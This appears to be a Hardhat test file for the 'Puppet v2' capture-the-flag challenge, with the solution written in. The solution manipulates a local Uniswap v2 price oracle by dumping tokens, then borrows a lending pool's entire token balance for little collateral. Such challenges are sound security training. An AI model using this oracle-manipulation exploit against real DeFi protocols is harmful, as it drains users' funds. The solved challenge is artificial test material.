const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

describe('[Challenge] Puppet v2', function () {
    let deployer, player;
    let token, weth, uniswapFactory, uniswapRouter, uniswapExchange, lendingPool;

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n;
    const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n;

    const PLAYER_INITIAL_TOKEN_BALANCE = 10000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 20n * 10n ** 18n;

    const POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, player] = await ethers.getSigners();

        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
    
        // Deploy tokens to be traded
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        weth = await (await ethers.getContractFactory('WETH', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        uniswapRouter = await UniswapRouterFactory.deploy(
            uniswapFactory.address,
            weth.address
        );        

        // Create Uniswap pair against WETH and add liquidity
        await token.approve(
            uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapRouter.addLiquidityETH(
            token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        uniswapExchange = await UniswapPairFactory.attach(
            await uniswapFactory.getPair(token.address, weth.address)
        );
        expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt(0);
            
        // Deploy the lending pool
        lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            weth.address,
            token.address,
            uniswapExchange.address,
            uniswapFactory.address
        );

        // Setup initial token balances of pool and player accounts
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Check pool's been correctly setup
        expect(
            await lendingPool.calculateDepositOfWETHRequired(10n ** 18n)
        ).to.eq(3n * 10n ** 17n);
        expect(
            await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.eq(300000n * 10n ** 18n);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        const printBalances = async () => {
            console.log("player weth", String(await weth.balanceOf(player.address)).slice(0, -18));
            console.log("player token", String(await token.balanceOf(player.address)).slice(0, -18));
            console.log("player eth", String(await ethers.provider.getBalance(player.address)).slice(0, -18));
            console.log("uniswap weth", String(await weth.balanceOf(uniswapExchange.address)).slice(0, -18));
            console.log("uniswap token", String(await token.balanceOf(uniswapExchange.address)).slice(0, -18));
            console.log("uniswap eth", String(await ethers.provider.getBalance(uniswapExchange.address)).slice(0, -18));
            console.log("weth required", String(await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)).slice(0, -18));
            console.log("-");
        }

        // Print the previous balance of player and uniswap
        await printBalances();

        // Approve uniswapRouter to spend all player's balance
        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE)
        // Swap all player's tokens for weth.
        await uniswapRouter.connect(player).swapExactTokensForTokens(
            PLAYER_INITIAL_TOKEN_BALANCE,                               // amountIn
            1,                                                          // amountOutMin
            [token.address, weth.address],                              // [From, To]
            player.address,                                             // to
            (await ethers.provider.getBlock('latest')).timestamp * 2    // deadline                                 // arbitrary deadline
        )
        // Print the current balance of player and uniswap
        await printBalances();

        // Deposit all Ether to get the extra WETH we need
        await weth.connect(player).deposit({value: ethers.utils.parseEther('19.9')})
        // Print the current balance of player and uniswap
        await printBalances();

        // Borrow the tokens from the pool
        const requiredWETH = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        await weth.connect(player).approve(lendingPool.address, requiredWETH);
        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
        // Print the balance of player and uniswap after the taking all tokens
        await printBalances();

    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // Player has taken all tokens from the pool        
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq(0);

        expect(
            await token.balanceOf(player.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});